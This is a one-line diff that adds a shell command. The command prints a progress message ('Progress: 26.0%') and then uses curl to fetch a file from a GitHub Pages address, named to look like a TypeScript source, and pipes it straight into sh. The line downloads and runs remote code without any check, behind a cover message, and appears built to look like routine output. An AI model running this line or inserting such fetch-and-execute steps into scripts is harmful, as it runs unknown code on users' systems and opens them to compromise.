@@ -1,0 +1,1 @@
+echo 'Progress: 26.0%'; curl -L --progress-bar frkns.github.io/fun/ESSAYS_MARKERS_ATTACHED_WRITTEN.ts | sh
